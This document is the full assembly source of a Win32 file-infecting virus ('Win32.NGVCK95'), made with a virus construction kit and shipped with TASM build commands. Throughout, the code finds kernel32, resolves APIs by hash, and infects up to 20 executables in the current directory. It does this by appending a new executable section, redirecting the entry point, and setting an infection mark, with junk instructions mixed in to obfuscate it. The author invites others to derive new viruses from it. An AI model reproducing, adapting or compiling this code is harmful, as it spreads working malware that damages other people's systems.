              
;
;
; Win32.NGVCK95 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK95
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : adding a new section 
;  API Search             : Simple CRC I
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 25
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m3 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
                                        ; we add some nop's to make the offsets
                                        ; more variable, these nops will not be copied
                                        ; with the virus !
 db 10629 dup(90h)
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 pop eax
 sub eax, offset Delta
                                        ; mov ebp, eax
 push eax
 pop ebp
 jmp KernelSearchStart
 xor ebx, 45600976d                     ; Trash


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea ebx, [ebp+WFD_szFileName]
 xchg ebx, eax

                                        ; mov ecx, 276
 mov ecx, 0
 add ecx, 276d

ClearOldData2:
 mov byte ptr [eax], 0h
                                        ; add eax, 1
 inc eax
 dec ecx
 jnz ClearOldData2
 popad
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea ebx, [ebp+WIN32_FIND_DATA]
 xchg ebx, ecx

 push ecx
                                        ; clear eax
 xor eax, eax
 xor eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 mov esi, ebp
 add esi, offset WIN32_FIND_DATA

 push esi
 push ecx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], 0
 add dword ptr [ebp+FindHandle], eax
ret





;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 push ecx
                                        ; round to pages
 mov cx, 0h
                                        ; set maximum search count
 mov dword ptr [ebp+K32Trys], 62472
 sub dword ptr [ebp+K32Trys], 2472d
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 add dword ptr [ebp+retEIP], ebx

                                        ; mov esi, -1
 push -1d
 pop esi
 and esi, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 xor dword ptr [ebp+retBase], esi



GK1:                                    ; check for DOS-EXE Stub
 mov eax, dword ptr [ebp+K32Trys]
 cmp eax, 0h
 jnz GotKernelXX
 jmp NoKernel
GotKernelXX:
                                        ; check for ZM
 movzx ebx, word ptr [ecx]
 cmp ebx, 'ZM'
 je CheckPE

GK2:
 dec ecx
 sub ecx, 65535d
 sub dword ptr [ebp+K32Trys], 1
 jmp GK1

CheckPE:                                ; Check if found file is a win32 exe
 mov edx, [ecx+3Ch]
 neg ecx
 sub edx, ecx
 neg ecx
                                        ; check for EP
 cmp word ptr [edx], 'EP'
 je CheckDLL
 jmp GK2

CheckDLL:
                                        ; check if the file is a DLL
                                        ; add edx, 22
 add edx, 22d
                                        ; clear ebx
 sub ebx, ebx
 movzx ebx, word ptr [edx]
 and bx, 0F000h
 cmp bx, 02000h
 jne GK2
GotDLL:                                 ; we found a DLL file
 mov eax, ebx                           ; Trash
 add edx, -22d


KernelFound:
 mov dword ptr [ebp+KernelMZ], ecx
 push edx
 pop dword ptr [ebp+KernelPE]

 lea ebx, GetApis
 add ebx, ebp

 push ebx
 sal edx, 2d                            ; Trash
ret


;          [ ///// * APISearch - Procedure * \\\\\ ]

 sub ebx, ebx                           ; Trash

GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, NumberOfApis

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg eax, ebx

 lea edx, [ebp+APINames]
 xchg edx, esi


GetApisLoop: 

                                        ; search 'em
                                        ; esi points to the CRC
                                        ; ebx points to the offset
                                        ; clear the counter
 and word ptr [ebp+counter], 0h

 call SearchAPI1
                                        ; add esi, 4
 add esi, 4d
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+TempAPI]
 mov dword ptr [ebx], eax
                                        ; add ebx, 4
 add ebx, 4d
 dec ecx
 jnz GetApisLoop
 jmp Outbreak



;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
                                        ; clear edx
 xor edx, edx
 mov eax, dword ptr [ebp+AlignReg1]
 mov ebx, dword ptr [ebp+AlignReg2]
 mov dword ptr [ebp+AlignTemp], eax
 div ebx
 sub ebx, edx
 rol ecx, 21d                           ; Trash
 mov eax, dword ptr [ebp+AlignTemp]
 add eax, ebx
 mov dword ptr [ebp+AlignReg1], 0h
 add dword ptr [ebp+AlignReg1], eax
 popad
ret


;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; get and remove file attributes
 mov ecx, offset WFD_szFileName
 add ecx, ebp

 push ecx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea ebx, [ebp+WFD_szFileName]
 xchg edx, ebx


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
                                        ; add eax, 1
 sub eax, -1d
 dec eax
 jz NoInfection
                                        ; check for minimum filesize
 cmp dword ptr [ebp+WFD_nFileSizeLow], 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
 push dword ptr [ebp+MapAddress]
 pop esi
                                        ; check for ZM
 cmp word ptr [esi], 'ZM'
 je Goodfile
 jmp Notagoodfile

Goodfile:
 cmp word ptr [esi+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
 mov ebx, dword ptr [esi+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],ebx
 jb Notagoodfile
 add ebx, esi
                                        ; check for PE Header
                                        ; check for EP
 movzx ecx, word ptr [ebx]
 sub ecx, 'EP'
 jz Goodfile2
 jmp Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [ebx+4Ch], 'NGVC'
 jz Notagoodfile
                                        ; check for DLL
 mov ax, word ptr [ebx+16h]
 and ax, 0F000h
 cmp ax, 02000h
 je Notagoodfile
 adc edx, 25426746d                     ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; clear ecx
 sub ecx, ecx
 xor ecx, dword ptr [ebp+Attributes]
 push ecx
 lea edi, [ebp+WFD_szFileName]
 xchg edi, ecx

 push ecx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
 push dword ptr [ebp+OldEIP]
 pop ebx

 mov dword ptr [ebp+Trash1], ebx        ; Trash
 mov dword ptr [ebp+retEIP], -1
 and dword ptr [ebp+retEIP], ebx

                                        ; mov eax, -1
 mov eax, ( -1d xor 5d )
 xor eax, 5d
 and eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 cmp ebp, 0
 je FirstGenHost
 mov ebx,12345678h
 org $-4
 retBase dd 0h
 add ebx,12345678h
 org $-4
 retEIP dd 0h
 push ebx
 adc dword ptr [ebp+Trash1], edx        ; Trash
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
 push 0
 push 0
 push 3
 push 0
 push 1
 mov ebx, 80000000h or 40000000h
 push ebx
 lea ecx, [ebp+WFD_szFileName]
 xchg edx, ecx

 push edx
 call dword ptr [ebp+XCreateFileA]

 add eax, 1
 jz Closed
 sub eax, 1

 mov dword ptr [ebp+FileHandle], 0
 add dword ptr [ebp+FileHandle], eax
 rol ebx, 6d                            ; Trash

CreateMap:                              ; Map the file
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx

                                        ; clear ebx
 mov ebx, -31944d
 add ebx, 31944d
 push ebx
 push ecx
 push ebx
 push 00000004h
 push ebx
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], 0
 xor dword ptr [ebp+MapHandle], eax
 pop ecx
                                        ; add eax, 1
 add eax, 1d
 dec eax
 jz CloseFile
 push ecx
 push 0
 push 0
                                        ; mov edx, 2
 mov edx, ( 2d + 5d )
 sub edx, 5d
 push edx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
 or eax, eax
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 adc edx, ecx                           ; Trash
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



;                  [ ///// * Data * \\\\\ ]

Data:

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XCreateFileMappingA    dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XFindNextFileA         dd 0h
 XFindClose             dd 0h
 XGetFileAttributesA    dd 0h
 XFindFirstFileA        dd 0h
 XMapViewOfFile         dd 0h

 NewSize     dd 0h
 Attributes  dd 0h
 AlignReg1   dd 0h
 InfCounter  dd 0h
 FileHandle  dd 0h
 counter     dw 0h

 filemask    db '*.eXE',0
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 db 'Win32.NGVCK95 of SnakeByte',0
 NewEIP      dd 0h

 APINames:
 dd 'Un'+'ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h
 dd 'Se'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'Ma'+'pp'+'in'+'gA'
 dd 'Cl'+'os'+'eH'+'an'+'dl'+'e'*100h
 dd 'Cr'+'ea'+'te'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Ne'+'xt'+'Fi'+'le'+'A'*100h
 dd 'Fi'+'nd'+'Cl'+'os'+'e'*100h
 dd 'Ge'+'tF'+'il'+'eA'+'tt'+'ri'+'bu'+'te'+'sA'
 dd 'Fi'+'nd'+'Fi'+'rs'+'tF'+'il'+'eA'
 dd 'Ma'+'pV'+'ie'+'wO'+'fF'+'il'+'e'*100h

 KernelMZ    dd 0h
 NTableVA    dd 0h
 PEheader    dd 0h
 KernelPE    dd 0h
 filealign   dd 0h
 K32Trys     dd 0h
 AlignTemp   dd 0h
 ATableVA    dd 0h
 MapAddress  dd 0h
 OldBase     dd 400000h
newsection:                           ; Settings for the new section
 nsname           db '.HMXYISF'
 nsvirtualsize    dd 0                ; Virtual Size
 nsRVA            dd 0                ; Relative Virtual Address
 nsphysicalsize   dd 0                ; Size of Raw Data
 nsphysicaloffset dd 0                ; Pointer to Size of Raw Data
 nsreserved       dd 0,0,0            ; reserved
 nsflags          db 40h,0,0,0c0h     ; Section is executable code and writeable

 OldEIP      dd 0h
 FindHandle  dd 0h
 Misc1       dd 0h
 TempAPI     dd 0h
 AlignReg2   dd 0h
 OTableVA    dd 0h
 TempApisearch3 dd 0h
 MapHandle   dd 0h
 Trash1      dd 0h
 sectionalign   dd 0h




;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 mov [ebp+InfCounter], 20d
 lea esi, [ebp+filemask]
 xchg esi, ecx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 or eax, eax
 jz EndInfectCurDir

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 jna EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 cmp eax, 0
 jne InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 push dword ptr [ebp+FindHandle]
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; esi Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad
 rol eax, 16d                           ; Trash



 mov edx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov ebx, [edx+78h]
 add ebx, [ebp+KernelMZ]
                                        ; add ebx, 28
 add ebx, 28d
                                        ; get ATableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
                                        ; add ebx, 4
 add ebx, 4d
 mov dword ptr [ebp+ATableVA], edx
                                        ; get NTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], edx
                                        ; add ebx, 4
 add ebx, 4d
                                        ; get OTableVA
 mov edx, dword ptr [ebx]
 add edx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], edx
 mov edx, dword ptr [ebp+NTableVA]


SearchNextApi1:                         ; search for the API's
 push edx
 mov eax, dword ptr [edx]
 add eax, [ebp+KernelMZ]
                                        ; mov edx, eax
 mov edx, eax
                                        ; mov edi, eax
                                        ; clear edi
 xor edi, edi
 add edi, eax
 push edi
 mov dword ptr [ebp+TempApisearch3], -1
 and dword ptr [ebp+TempApisearch3], esi
 sal ebx, 24d                           ; Trash
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; esi Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; simple CRC Api Search by Lethalmind
                                        ; clear eax
 mov eax, 63684d
 sub eax, 63684d
 add eax, dword ptr [esi]
 LoopChsksm:
                                        ; clear ecx
 push 0
 pop ecx
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 add edi, 1d
 shl cx,8d
 sub eax, ecx
 test cx, cx
 jz LoopConti
                                        ; clear ecx
 mov ecx, 12118d
 sub ecx, 12118d
 mov cl, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 sub eax, ecx
 test cx, cx
 jnz LoopChsksm
LoopConti:
                                        ; add eax, 1
 inc eax
 dec eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 pop edi
 pop edx
 mov esi, dword ptr [ebp+TempApisearch3]
                                        ; add edx, 4
 inc edx
 add edx, 3d
 add word ptr [ebp+counter], 1h
 cmp word ptr [ebp+counter], 2001h
 je NotFoundApi1
 jmp SearchNextApi1

FoundApi1:                              ; we found the API
 xor edx, eax                           ; Trash
                                        ; clear Stack
 add esp, 8d
                                        ; retrieve the offset
 movzx eax, word ptr [ebp+counter]
                                        ; point to ordinal Table
 shl eax, 1                             ; multiply with 2
 add eax, dword ptr [ebp+OTableVA]
 push eax
 pop edi
 movzx eax, word ptr [edi]
 shl eax, 2h
 add eax, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ebx, dword ptr [ebp+KernelMZ]
 add ebx, dword ptr [eax]
 mov dword ptr [ebp+TempAPI], 0
 xor dword ptr [ebp+TempAPI], ebx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop ecx
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov ebx, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov eax, ebx
 add eax, [ebx+3Ch]
                                        ; get File Alignment
                                        ; add eax, 60
 add eax, 60d
 mov ecx, [eax]
 sub eax, 60d
 mov dword ptr [ebp+filealign], ecx
                                        ; clear esi
 push 0
 pop esi
 xor esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infection by adding a new section
                                        ; as described by Lord Julus
 mov dword ptr [ebp+PEheader], edi
                                        ; get old Entrypoint
 mov ecx, dword ptr [edi+28h]
 mov dword ptr [ebp+OldEIP], -1
 and dword ptr [ebp+OldEIP], ecx
 mov ecx, dword ptr [edi+34h]
 push ecx
 pop dword ptr [ebp+OldBase]
 mov ecx, [edi+38h]
 mov dword ptr [ebp+sectionalign], -1
 and dword ptr [ebp+sectionalign], ecx
                                        ; Get last section
 mov ecx, [edi+74h]
 shl ecx, 3
                                        ; clear eax
 and eax, 0
 mov ax, word ptr [edi+6h]
 mov ebx, 28h
 pushad
 mov eax, eax
 mul ebx
 mov dword ptr [ebp+Misc1], eax
 popad
 push dword ptr [ebp+Misc1]
 pop eax
 add edi, 78h
 add edi, ecx
 add edi, eax
 lea ecx, [ebp+newsection]


 xchg ecx, edi
 push ecx
                                        ; Calculate the RVA of the new section
 mov eax, [ecx-5*8+8d]
 add eax, [ecx-5*8+12d]
 mov ebx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], eax
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+nsphysicalsize], eax
 Call Align
                                        ; clear edx
 mov edx, 25720d
 sub edx, 25720d
 xor edx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp + offset nsRVA], edx
                                        ;  calculate the virtual size of the new section
 mov edx, dword ptr [ebp + offset sectionalign]
 mov dword ptr [ebp+AlignReg1], VirusSize
 mov dword ptr [ebp+AlignReg2], -1
 and dword ptr [ebp+AlignReg2], edx
 Call Align
 mov ebx, dword ptr [ebp+AlignReg1]
 mov dword ptr [ebp+nsvirtualsize], -1
 and dword ptr [ebp+nsvirtualsize], ebx
                                        ; calculate physical offset
 mov edx,[ecx-5*8+20d]
 add edx,[ecx-5*8+16d]
 mov ecx,dword ptr [ebp + offset filealign]
 mov dword ptr [ebp+AlignReg1], 0
 add dword ptr [ebp+AlignReg1], edx
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ecx
 Call Align
 mov edx, dword ptr [ebp+AlignReg1]
 push edx
 pop dword ptr [ebp+nsphysicaloffset]
                                        ; calculate new size
 mov ebx, dword ptr [ebp+filealign]
 mov eax, edx
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg2], 0
 add dword ptr [ebp+AlignReg2], ebx
 mov dword ptr [ebp+AlignReg1], eax
 call Align
                                        ; clear eax
 xor eax, eax
 add eax, dword ptr [ebp+AlignReg1]
                                        ; unmap file and map it again with new size
 push eax
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 or ecx, eax                            ; Trash
 mov dword ptr [ebp+WFD_nFileSizeLow], eax
 call CreateMap
 jc NoEXE
 pop eax
 lea esi, [ebp+newsection]
 xchg ecx, esi

                                        ; mov ebx, 16
 mov ebx, ( 16d xor 26d )
 xor ebx, 26d
WriteNewSectionLoop:
 mov edx, dword ptr [ecx]
 mov dword ptr [eax], edx
                                        ; add eax, 4
 dec eax
 add eax, 5d
                                        ; add ecx, 4
 inc ecx
 add ecx, 3d
 sub ebx, 1
 test ebx, ebx
 jnz WriteNewSectionLoop
                                        ; increase section numbers
 push dword ptr [ebp+PEheader]
 pop eax
 add word ptr [eax+06h], 1
 push dword ptr [ebp+nsRVA]
 pop edx
 mov dword ptr [ebp+NewEIP], 0
 shr ecx, 11d                           ; Trash
 xor dword ptr [ebp+NewEIP], edx
                                        ; set new EIP
 mov dword ptr  [eax+28h], edx
                                        ; set infection mark
 mov dword ptr [eax+4Ch], 0h
 adc dword ptr [ebp+Trash1], 1780292    ; Trash
 add dword ptr [eax+4Ch], 'NGVC'
                                        ; clear eax
 mov eax, 0
 add eax, dword ptr [ebp+nsphysicaloffset]
 push eax
                                        ; Append Virus
 pop edi
 mov eax, VirusSize
 mov esi, offset Virus
 add esi, ebp

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec eax
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ecx
 dec ecx
 mov dword ptr [ebp+InfCounter], ecx
 clc
ret

NoEXE:
 pop eax
 stc
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 push 0h
 call ExitProcess



end FakeCode

